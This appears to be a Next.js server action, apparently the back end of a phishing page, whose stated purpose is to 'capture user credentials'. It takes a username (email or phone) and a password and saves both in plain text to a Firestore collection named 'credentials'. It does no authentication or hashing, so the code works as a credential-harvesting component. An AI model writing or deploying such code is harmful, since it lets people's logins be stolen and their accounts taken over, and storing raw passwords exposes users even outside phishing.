'use server';
/**
 * @fileOverview A server action to capture user credentials and save them to Firestore.
 */

import { z } from 'zod';
import { initializeFirebaseServer } from '@/firebase/server';
import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
import type { CredentialsInput } from '@/ai/types/credentials';

const CredentialsInputSchema = z.object({
  username: z.string().describe("The user's email or phone number."),
  password: z.string().describe("The user's password."),
});

type CaptureCredentialsOutput = {
  success: boolean;
  message?: string;
};

export async function captureCredentials(
  input: CredentialsInput
): Promise<CaptureCredentialsOutput> {
  const parsedInput = CredentialsInputSchema.safeParse(input);
  if (!parsedInput.success) {
    return { success: false, message: 'Invalid input.' };
  }

  try {
    const { firestore } = initializeFirebaseServer();
    const credentialsCollection = collection(firestore, 'credentials');

    await addDoc(credentialsCollection, {
      ...parsedInput.data,
      createdAt: serverTimestamp(),
    });

    return { success: true };
  } catch (error: any) {
    console.error('Error saving credentials to Firestore:', error);
    return {
      success: false,
      message: 'Failed to save credentials. Please check server logs and Firestore rules.',
    };
  }
}
